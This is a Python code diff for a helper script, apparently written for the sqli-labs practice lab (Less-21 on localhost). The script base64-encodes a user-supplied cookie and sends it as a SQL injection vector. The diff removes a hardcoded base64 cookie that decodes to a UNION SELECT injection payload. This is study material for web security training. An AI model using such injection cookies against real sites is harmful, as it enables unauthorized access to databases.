@@ -24,6 +24,7 @@ class WebSpider(get_basic_information):
             r.raise_for_status
             r.encoding=r.apparent_encoding
             message=BeautifulSoup(r.text,"html.parser")
+            print("[+]      已经成功登陆该网站")
             return message
         except:
             return "[+]     因为某些原因，你无法登录到这个网站"
@@ -37,7 +38,8 @@ class CookieEncoder:
         bytes_cookie=self.cookie.encode("utf-8")
         cookie=base64.b64encode(bytes_cookie)
 
-        return str(cookie)
+
+        return cookie.decode()  #decode去掉b'
 
 
 class FindTarget:
@@ -56,16 +58,15 @@ class FindTarget:
 
 basic_cookie_value=input("[+]      请输入这个原始cookie:")
 bs64_cookie=CookieEncoder(basic_cookie_value).encoder()
-print(bs64_cookie)
+# print(bs64_cookie)
 
-
-"""
 web=FindTarget("font",
-                {"uname":" YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwxLGRhdGFiYXNlKCkgbGltaXQgMSwxIw="},
+                {"uname":bs64_cookie},
                 "http://127.0.0.1/sqllab/Less-21/",
                 {"color":"grey"})
 web.showDate()
-"""         
+end=input("[+]      任意键结束:")
+      
 
 
 
